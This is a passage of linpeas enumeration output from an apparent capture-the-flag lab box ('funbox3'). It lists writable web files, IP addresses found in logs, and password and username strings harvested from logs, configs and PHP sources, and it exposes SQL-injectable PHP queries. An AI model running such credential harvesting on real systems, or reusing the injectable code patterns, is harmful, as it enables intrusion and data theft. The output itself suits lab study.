Jul 31 2020 /var/backups total 704\r-rw-r--r-- 1 root root 51200 Jul 31 2020 alternatives.tar.0\r-rw-r--r-- 1 root root 35806 Jul 30 2020 apt.extended_states.0\r-rw-r--r-- 1 root root 268 Jul 30 2020 dpkg.diversions.0\r-rw-r--r-- 1 root root 172 Jul 30 2020 dpkg.statoverride.0\r-rw-r--r-- 1 root root 619038 Jul 30 2020 dpkg.status.0\r[+] Backup files\r-rw-r--r-- 1 root root 2743 Apr 23 2020 /etc/apt/sources.list.curtin.old -rwxr-xr-x 1 root root 1086 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/tools/testing/selftests/net/tcp_fastopen_backup_key.sh\r-rw-r--r-- 1 root root 0 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/include/config/net/team/mode/activebackup.h\r-rw-r--r-- 1 root root 0 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/include/config/wm831x/backup.h\r-rw-r--r-- 1 root root 237784 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/.config.old\r-rw-r--r-- 1 root root 8161 Jul 9 2020 /usr/lib/modules/5.4.0-42-generic/kernel/drivers/net/team/team_mode_activebackup.ko\r-rw-r--r-- 1 root root 8729 Jul 9 2020 /usr/lib/modules/5.4.0-42-generic/kernel/drivers/power/supply/wm831x_backup.ko\r-rw-r--r-- 1 root root 35320 Jul 27 2020 /usr/lib/mysql/plugin/component_mysqlbackup.so -rw-r--r-- 1 root root 44048 Jun 22 2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so\r-rwxr-xr-x 1 root root 226 Feb 17 2020 /usr/share/byobu/desktop/byobu.desktop.old\r-rw-r--r-- 1 root root 11070 Jul 30 2020 /usr/share/info/dir.old\r-rw-r--r-- 1 root root 7867 Jul 16 1996 /usr/share/doc/telnet/README.old.gz\r-rw-r--r-- 1 root root 392817 Feb 9 2020 /usr/share/doc/manpages/Changes.old.gz\r-rw-r--r-- 1 root root 2756 Feb 13 2020 /usr/share/man/man8/vgcfgbackup.8.gz\r[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)\r[+] Web files?(output limit)\r/var/www/: total 16K\rdrwxr-xr-x 3 root root 4.0K Oct 30 2020 .\rdrwxr-xr-x 14 root root 4.0K Jul 30 2020 ..\rdrwxr-xr-x 6 root root 4.0K Jul 31 2020 html\r-rw-r--r-- 1 www-data www-data 33 May 6 02:34 local.txt\r/var/www/html:\rtotal 220K\rdrwxr-xr-x 6 root root 4.0K Jul 31 2020 .\r[+] Readable hidden interesting files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data [+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) -rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.daily/.placeholder -rw------- 1 root root 0 Apr 23 2020 /etc/.pwd.lock\r-rw-r--r-- 1 root root 3771 Feb 25 2020 /etc/skel/.bashrc\r-rw-r--r-- 1 root root 807 Feb 25 2020 /etc/skel/.profile\r-rw-r--r-- 1 root root 220 Feb 25 2020 /etc/skel/.bash_logout\r-rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.d/.placeholder\r-rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.monthly/.placeholder\r-rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.weekly/.placeholder\r-rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.hourly/.placeholder\r-rw-r--r-- 1 root root 97 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/kconfig/.gitignore\r-rw-r--r-- 1 root root 55 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/mod/.gitignore\r-rw-r--r-- 1 root root 9 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/genksyms/.gitignore\r-rw-r--r-- 1 root root 7 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/basic/.gitignore\r-rw-r--r-- 1 root root 4 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/dtc/.gitignore\r-rw-r--r-- 1 root root 24 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/gcc-plugins/.gitignore\r-rw-r--r-- 1 root root 11 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/selinux/genheaders/.gitignore\r-rw-r--r-- 1 root root 21 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/selinux/mdp/.gitignore\r-rw-r--r-- 1 root root 145 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/.gitignore\r-rw-r--r-- 1 root root 25 Nov 25 2019 /usr/src/linux-headers-5.4.0-42/scripts/gdb/linux/.gitignore\r-rw-r--r-- 1 root root 64540 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/kernel/.asm-offsets.s.cmd\r-rw-r--r-- 1 root root 266 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd\r-rw-r--r-- 1 root root 291 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd\r-rw-r--r-- 1 root root 271 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd\r-rw-r--r-- 1 root root 267 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd\r-rw-r--r-- 1 root root 243 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd\r-rw-r--r-- 1 root root 271 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd\r-rw-r--r-- 1 root root 243 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd\r-rw-r--r-- 1 root root 353 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd\r-rw-r--r-- 1 root root 4821 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/tools/.relocs_common.o.cmd\r-rw-r--r-- 1 root root 148 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/tools/.relocs.cmd\r-rw-r--r-- 1 root root 4841 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/tools/.relocs_32.o.cmd\r-rw-r--r-- 1 root root 4841 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/tools/.relocs_64.o.cmd\r-rw-r--r-- 1 root root 14448 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/kernel/.bounds.s.cmd\r-rw-r--r-- 1 root root 237625 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/.config\r-rw-r--r-- 1 root root 39 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/.gitignore\r-rw-r--r-- 1 root root 3708 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.libctype.o.cmd\r-rw-r--r-- 1 root root 6293 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.parse-options.o.cmd\r-rw-r--r-- 1 root root 8955 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.orc_dump.o.cmd\r-rw-r--r-- 1 root root 9371 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/arch/x86/.decode.o.cmd\r-rw-r--r-- 1 root root 449 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/arch/x86/.objtool-in.o.cmd\r-rw-r--r-- 1 root root 4509 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.str_error_r.o.cmd\r-rw-r--r-- 1 root root 6818 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.exec-cmd.o.cmd\r-rw-r--r-- 1 root root 7763 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.builtin-check.o.cmd\r-rw-r--r-- 1 root root 8589 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.orc_gen.o.cmd\r-rw-r--r-- 1 root root 9073 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.elf.o.cmd\r-rw-r--r-- 1 root root 1910 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.objtool-in.o.cmd\r-rw-r--r-- 1 root root 1934 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.subcmd-config.o.cmd\r-rw-r--r-- 1 root root 6979 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.pager.o.cmd\r-rw-r--r-- 1 root root 6432 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.objtool.o.cmd\r-rw-r--r-- 1 root root 420 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.fixdep-in.o.cmd\r-rw-r--r-- 1 root root 7864 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.help.o.cmd\r-rw-r--r-- 1 root root 8424 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.run-command.o.cmd\r-rw-r--r-- 1 root root 8025 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.builtin-orc.o.cmd\r-rw-r--r-- 1 root root 1238 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.libsubcmd-in.o.cmd\r-rw-r--r-- 1 root root 8568 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.special.o.cmd\r-rw-r--r-- 1 root root 6024 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.sigchain.o.cmd\r-rw-r--r-- 1 root root 5907 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.libstring.o.cmd\r-rw-r--r-- 1 root root 8664 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.check.o.cmd\r-rw-r--r-- 1 root root 5270 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.fixdep.o.cmd\r-rw-r--r-- 1 root root 4404 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.fixdep.o.d\r-rw-r--r-- 1 root root 237784 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/.config.old\r-rw-r--r-- 1 root root 999 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/.missing-syscalls.d\r-rw-r--r-- 1 root root 8168 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/.sign-file.cmd\r-rw-r--r-- 1 root root 3950 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/.kallsyms.cmd\r-rw-r--r-- 1 root root 3686 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/.conmakehash.cmd\r-rw-r--r-- 1 root root 4147 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.symbol.o.cmd\r-rw-r--r-- 1 root root 129 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.lexer.lex.c.cmd\r-rw-r--r-- 1 root root 176 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.parser.tab.h.cmd\r-rw-r--r-- 1 root root 5738 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.confdata.o.cmd\r-rw-r--r-- 1 root root 245 Jul 9 2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.conf.cmd\r[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) -rw-r--r-- 1 root root 268 Jul 30 2020 /var/backups/dpkg.diversions.0 -rw-r--r-- 1 root root 619038 Jul 30 2020 /var/backups/dpkg.status.0\r-rw-r--r-- 1 root root 35806 Jul 30 2020 /var/backups/apt.extended_states.0\r-rw-r--r-- 1 root root 172 Jul 30 2020 /var/backups/dpkg.statoverride.0\r-rw-r--r-- 1 root root 51200 Jul 31 2020 /var/backups/alternatives.tar.0\r[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /dev/mqueue /dev/shm\r/home/tony\r/run/lock\r/run/screen\r/run/screen/S-tony\r/run/user/1000\r/run/user/1000/dbus-1\r/run/user/1000/dbus-1/services\r/run/user/1000/gnupg\r/run/user/1000/inaccessible\r/run/user/1000/systemd\r/run/user/1000/systemd/units\r/snap/core18/1885/tmp\r/snap/core18/1885/var/tmp\r/snap/core18/1932/tmp\r/snap/core18/1932/var/tmp\r/tmp\r/tmp/.ICE-unix\r/tmp/.Test-unix\r/tmp/.X11-unix\r/tmp/.XIM-unix\r/tmp/.font-unix\r#)You_can_write_even_more_files_inside_last_directory\r/var/crash\r/var/lib/php/sessions\r/var/tmp\r/var/www/html/store\r/var/www/html/store/.gitattributes\r/var/www/html/store/README.md\r/var/www/html/store/admin.php\r/var/www/html/store/admin_add.php\r/var/www/html/store/admin_book.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/html/store/bootstrap/css\r/var/www/html/store/bootstrap/css/bootstrap-theme.min.css\r/var/www/html/store/bootstrap/css/bootstrap.min.css\r/var/www/html/store/bootstrap/css/jumbotron.css\r/var/www/html/store/bootstrap/fonts\r/var/www/html/store/bootstrap/fonts/glyphicons-halflings-regular.eot\r/var/www/html/store/bootstrap/fonts/glyphicons-halflings-regular.ttf\r/var/www/html/store/bootstrap/fonts/glyphicons-halflings-regular.woff\r/var/www/html/store/bootstrap/fonts/glyphicons-halflings-regular.woff2\r/var/www/html/store/bootstrap/img\r/var/www/html/store/bootstrap/js\r/var/www/html/store/bootstrap/js/bootstrap.min.js\r/var/www/html/store/bootstrap/js/jquery-2.1.4.min.js\r/var/www/html/store/cart.php\r/var/www/html/store/checkout.php\r/var/www/html/store/contact.php\r/var/www/html/store/controllers\r/var/www/html/store/controllers/DatabaseTalking\r/var/www/html/store/controllers/DatabaseTalking/Take.php\r/var/www/html/store/controllers/DatabaseTalking/Talking.php\r/var/www/html/store/database\r/var/www/html/store/database/readme.txt.txt\r/var/www/html/store/database/www_project.sql\r/var/www/html/store/edit_book.php\r/var/www/html/store/empty_session.php\r/var/www/html/store/functions\r/var/www/html/store/functions/admin.php\r/var/www/html/store/functions/cart_functions.php\r/var/www/html/store/functions/database_functions.php\r/var/www/html/store/index.php\r/var/www/html/store/models\r/var/www/html/store/models/admin\r/var/www/html/store/models/admin/Admin.php\r/var/www/html/store/models/customer\r/var/www/html/store/models/customer/Customers.php\r/var/www/html/store/models/goods\r/var/www/html/store/models/goods/Address.php\r/var/www/html/store/models/goods/Author.php\r/var/www/html/store/models/goods/Book.php\r/var/www/html/store/models/goods/BookTest.php\r/var/www/html/store/models/goods/Genre.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/html/store/models/interfaces\r/var/www/html/store/models/interfaces/Damage.php\r/var/www/html/store/models/orders\r/var/www/html/store/models/orders/OrderDetails.php\r/var/www/html/store/models/orders/Orders.php\r/var/www/html/store/models/orders/OrdersTest.php\r/var/www/html/store/models/orders/UnAvailableOrderDetails.php\r/var/www/html/store/models/reviews\r/var/www/html/store/models/reviews/Review.php\r/var/www/html/store/models/serve\r/var/www/html/store/models/serve/FileInterface.php\r/var/www/html/store/models/serve/Image.php\r/var/www/html/store/process.php\r/var/www/html/store/publisher_list.php\r/var/www/html/store/purchase.php\r/var/www/html/store/template\r/var/www/html/store/template/footer.php\r/var/www/html/store/template/header.php\r/var/www/html/store/verify.php\r[+] Interesting GROUP writable files (not in Home) (max 500)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files Group tony: Group adm:\rGroup cdrom:\rGroup sudo:\rGroup dip:\rGroup plugdev:\rGroup lxd:\r[+] Searching passwords in config PHP files\r[+] Checking for TTY (sudo/su) passwords in audit logs\r[+] Finding IPs inside logs (limit 70)\r325309 /var/log/apache2/access.log:192.168.45.5 64998 /var/log/apache2/error.log:192.168.45.5\r849 /var/log/apache2/access.log:192.168.183.111\r105 /var/log/apache2/error.log:192.168.183.111\r10 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:192.168.45.5\r10 /var/log/auth.log:192.168.45.5\r9 /var/log/syslog:91.189.94.4\r9 /var/log/syslog:91.189.91.157\r9 /var/log/syslog:185.125.190.58\r9 /var/log/syslog:185.125.190.57\r9 /var/log/syslog:185.125.190.56\r1 /var/log/wtmp:192.168.45.5\r1 /var/log/mysql/error.log:192.168.45.5\r1 /var/log/lastlog:192.168.45.5\r1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:91.189.94.4\r1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:91.189.91.157\r1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:185.125.190.58\r1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:185.125.190.57\r1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:185.125.190.56\r[+] Finding passwords inside logs (limit 70)\r/var/log/apache2/access.log:192.168.45.5 - - [06/May/2023:03:09:29 +0000] \u0026#34;GET /forgot-password.php HTTP/1.1\u0026#34; 200 1255 \u0026#34;-\u0026#34; \u0026#34;gobuster/3.5\u0026#34;\r/var/log/auth.log.1:Feb 17 19:44:20 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;. /var/log/auth.log.1:Feb 17 19:44:23 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;. /var/log/auth.log.1:Feb 17 19:44:27 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;. /var/log/auth.log:May 6 02:34:48 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;. /var/log/auth.log:May 6 02:34:49 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;. /var/log/auth.log:May 6 02:34:50 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;. /var/log/auth.log:May 6 02:34:56 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;. /var/log/auth.log:May 6 02:34:57 funbox3 VGAuth[643]: message repeated 2 times: [ vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;.]\r/var/log/auth.log:May 6 02:35:01 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;. /var/log/auth.log:May 6 02:35:02 funbox3 VGAuth[643]: message repeated 2 times: [ vmtoolsd: Username and password successfully validated for \u0026#39;root\u0026#39;.]\r/var/log/auth.log:May 6 04:39:00 funbox3 sshd[4953]: Failed password for root from 192.168.45.5 port 47458 ssh2\r/var/log/auth.log:May 6 04:39:46 funbox3 sshd[5054]: Accepted password for tony from 192.168.45.5 port 39270 ssh2\r/var/log/auth.log:May 6 04:39:56 funbox3 sudo: tony : TTY=pts/1 ; PWD=/home/tony ; USER=root ; COMMAND=list\r/var/log/auth.log:May 6 04:45:22 funbox3 sudo: tony : TTY=pts/1 ; PWD=/home/tony ; USER=root ; COMMAND=list\r/var/log/dmesg.0:[ 107.023615] systemd[1]: Started Forward Password Requests to Wall Directory Watch.\r/var/log/dmesg:[ 2.715410] systemd[1]: Started Forward Password Requests to Wall Directory Watch.\rBinary file /var/log/cloud-init.log matches\rBinary file /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal matches\rBinary file /var/log/journal/92ec3c988921478186aee5c70411b62c/system@0005f4c26b083950-593d012a5eb63820.journal~ matches\rBinary file /var/log/journal/92ec3c988921478186aee5c70411b62c/system@0005f4ccd9cc6b92-28d4f010916dc674.journal~ matches\rBinary file /var/log/journal/92ec3c988921478186aee5c70411b62c/system@0005f4ea81d1e2c4-fe457fded63bc225.journal~ matches\r[+] Finding emails inside logs (limit 70)\r3 /var/log/kern.log.1:giometti@linux.it 3 /var/log/kern.log.1:dm-devel@redhat.com\r1 /var/log/dmesg:giometti@linux.it\r1 /var/log/dmesg:dm-devel@redhat.com\r1 /var/log/dmesg.0:giometti@linux.it\r1 /var/log/dmesg.0:dm-devel@redhat.com\r[+] Finding *password* or *credential* files in home (limit 70)\r[+] Finding passwords inside key folders (limit 70) - only PHP files\r./linpeas.sh: 3147: printf: %20/: invalid directive /var/www/html/registration.php: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;cpassword\u0026#34; id=\u0026#34;cpassword\u0026#34; class=\u0026#34;form-control\u0026#34;\u0026gt; /var/www/html/registration.php: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34;\u0026gt; /var/www/html/registration.php: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;phone\u0026#34; id=\u0026#34;txtpassword\u0026#34; class=\u0026#34;form-control\u0026#34;\u0026gt; /var/www/html/registration.php: if(document.getElementById(\u0026#39;cpassword\u0026#39;).value!=document.getElementById(\u0026#39;password\u0026#39;).value) /var/www/html/registration.php: if(document.getElementById(\u0026#39;cpassword\u0026#39;).value==\u0026#34;\u0026#34;) /var/www/html/registration.php: if(document.getElementById(\u0026#39;password\u0026#39;).value==\u0026#34;\u0026#34;)\r/var/www/html/registration.php: $password=$_POST[\u0026#39;password\u0026#39;];\r/var/www/html/registration.php: document.getElementById(\u0026#39;cpwd\u0026#39;).innerHTML=\u0026#34;*Confirm password field empty.\u0026#34;;\r/var/www/html/registration.php: document.getElementById(\u0026#39;cpwd\u0026#39;).style.display=\u0026#34;block\u0026#34;;\r/var/www/html/registration.php: document.getElementById(\u0026#39;cpwd\u0026#39;).style.display=\u0026#34;none\u0026#34;;\r/var/www/html/registration.php: document.getElementById(\u0026#39;mpwd\u0026#39;).innerHTML=\u0026#34;*Password or Cofirm Password doesnot match.\u0026#34;;\r/var/www/html/registration.php: document.getElementById(\u0026#39;mpwd\u0026#39;).style.display=\u0026#34;block\u0026#34;;\r/var/www/html/registration.php: document.getElementById(\u0026#39;mpwd\u0026#39;).style.display=\u0026#34;none\u0026#34;;\r/var/www/html/registration.php: document.getElementById(\u0026#39;pwd\u0026#39;).innerHTML=\u0026#34;*Password field empty.\u0026#34;;\r/var/www/html/registration.php: document.getElementById(\u0026#39;pwd\u0026#39;).style.display=\u0026#34;block\u0026#34;;\r/var/www/html/registration.php: document.getElementById(\u0026#39;pwd\u0026#39;).style.display=\u0026#34;none\u0026#34;;\r/var/www/html/store/models/customer/Customers.php: $this-\u0026gt;password = $password;\r[+] Finding passwords inside key folders (limit 70) - no PHP files\r./linpeas.sh: 3151: printf: %20/: invalid directive [+] Finding possible password variables inside key folders (limit 140)\r/var/www/html/gym/New Text Document.txt:$mysql_database = \u0026#34;a8743500_secure\u0026#34;; [+] Finding possible password in config files\r/etc/debconf.conf passwords.\rpassword\rpasswords.\rpasswords\rpassword\rpasswords.dat\rpasswords and one for everything else.\rpasswords\rpassword is really\rPasswd: secret\r/etc/sysctl.d/10-ptrace.conf\rcredentials that exist in memory (re-using existing SSH connections,\r/etc/overlayroot.conf\rpassword is randomly generated\rpassword will be stored for recovery in\rpasswd\rpassword,mkfs=0\rPASSWORD=\u0026#34;foobar\u0026#34;\rPASSWORD\u0026#34; |\rPASSWORD\u0026#34; |\rPASSWORD HERE IN THIS CLEARTEXT CONFIGURATION\rpasswords are more secure, but you won\u0026#39;t be able to\rpasswords are generated by calculating the sha512sum\r/etc/adduser.conf\rpasswd\r/etc/apache2/apache2.conf\rpasswd files from being\r/etc/nsswitch.conf\rpasswd: files systemd\r[+] Finding \u0026#39;username\u0026#39; string inside key folders (limit 70)\r/var/www/html/admin/assets/js/login.js: txtusername: { /var/www/html/admin/assets/js/login_v2.js: txtusername: {\r/var/www/html/admin/index.php: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;email\u0026#34; id=\u0026#34;txtusername\u0026#34; class=\u0026#34;form-control\u0026#34;\u0026gt; /var/www/html/forgot-password.php: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;email\u0026#34; id=\u0026#34;txtusername\u0026#34; class=\u0026#34;form-control\u0026#34;\u0026gt; /var/www/html/gym/Feedback.php: \u0026lt;?php if (!isset($_SESSION[\u0026#39;username\u0026#39;])){echo\u0026#39;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;packages.php\u0026#34;\u0026gt;Package\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\r/var/www/html/gym/admin/a.php: \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Username\u0026#34; name=\u0026#34;bank\u0026#34; \u0026gt;\r/var/www/html/gym/admin/a.php: \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Username\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\r/var/www/html/gym/admin/a.php:$jack=mysqli_query($mysqli,\u0026#34;UPDATE `members` SET paid = 1 where username = \u0026#39;$bank\u0026#39;\u0026#34;);\r/var/www/html/gym/admin/a.php:Enter USERNAME to mark absent: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;id\u0026#34; size=\u0026#34;5\u0026#34;\u0026gt;\r/var/www/html/gym/admin/a.php:Enter USERNAME to mark the present: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;id\u0026#34; size=\u0026#34;5\u0026#34;\u0026gt;\r/var/www/html/gym/att/matt.php:$username = $_POST[\u0026#39;id\u0026#39;];\r/var/www/html/gym/att/matta.php:$username = $_POST[\u0026#39;id\u0026#39;];\r/var/www/html/gym/editp.php: $q = mysqli_query($mysqli, \u0026#34;UPDATE `members` SET fname = \u0026#39;$fn\u0026#39; WHERE username = \u0026#39;$username\u0026#39;\u0026#34;);\r/var/www/html/gym/editp.php:$username = $_POST[\u0026#39;id\u0026#39;];\r/var/www/html/gym/ex/admin/a.php: \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Username\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\r/var/www/html/gym/ex/admin/a.php:Enter USERNAME to mark absent: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;id\u0026#34; size=\u0026#34;5\u0026#34;\u0026gt;\r/var/www/html/gym/ex/admin/a.php:Enter USERNAME to mark present: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;id\u0026#34; size=\u0026#34;5\u0026#34;\u0026gt;\r/var/www/html/gym/ex/att/matt.php:$username = $_POST[\u0026#39;id\u0026#39;];\r/var/www/html/gym/ex/att/matta.php:$username = $_POST[\u0026#39;id\u0026#39;];\r/var/www/html/gym/ex/editp.php: $q = mysqli_query($mysqli, \u0026#34;UPDATE `members` SET fname = \u0026#39;$fn\u0026#39; WHERE username = \u0026#39;$username\u0026#39;\u0026#34;);\r/var/www/html/gym/ex/editp.php:$username = $_POST[\u0026#39;id\u0026#39;];\r/var/www/html/gym/ex/include/functions.php: $_SESSION[\u0026#39;username\u0026#39;] = $username;\r/var/www/html/gym/ex/include/functions.php: $username = preg_replace(\u0026#34;/[^a-zA-Z0-9_\\-]+/\u0026#34;, /var/www/html/gym/ex/include/functions.php: $username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/ex/include/register.inc.php: $p_stmt = \u0026#34;SELECT id FROM members WHERE username = ? LIMIT 1\u0026#34;;\r/var/www/html/gym/ex/include/register.inc.php: $username = filter_input(INPUT_POST, \u0026#39;username\u0026#39;, FILTER_SANITIZE_STRING);\r/var/www/html/gym/ex/index.php: \u0026lt;?php if (!isset($_SESSION[\u0026#39;username\u0026#39;])){echo\u0026#39;\u0026lt;li class=\u0026#34;active\u0026#34; id=\u0026#34;a\u0026#34;\u0026gt;\r/var/www/html/gym/ex/profile/action.php:$query1=mysqli_query($mysqli,\u0026#34;UPDATE `members` SET username =\u0026#39;$username\u0026#39;, email = \u0026#39;$email\u0026#39; where id = \u0026#39;$i\u0026#39;\u0026#34;);\r/var/www/html/gym/ex/profile/action.php:$username = $_POST[\u0026#39;username\u0026#39;];\r/var/www/html/gym/ex/profile/edit.php: \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; value=\u0026#34;\u0026lt;?php echo $q1[\u0026#39;username\u0026#39;];?\u0026gt;\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\r/var/www/html/gym/ex/profile/fun.php: $query=\u0026#34;update members set url=\u0026#39;$url\u0026#39;, lastUpload=now() where username=\u0026#39;$user\u0026#39;\u0026#34;;\r/var/www/html/gym/ex/profile/fun.php:$pull=\u0026#34;select * from members where username=\u0026#39;$user\u0026#39;\u0026#34;;\r/var/www/html/gym/ex/profile/fun.php:$query = \u0026#34;SELECT * FROM `members` WHERE username = \u0026#39;$username\u0026#39;\u0026#34;; /var/www/html/gym/ex/profile/fun.php:$username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/ex/profile/i.php: $username = $_SESSION[\u0026#39;username\u0026#39;];\r/var/www/html/gym/ex/profile/i.php:$query = \u0026#34;SELECT * FROM `members` WHERE username = 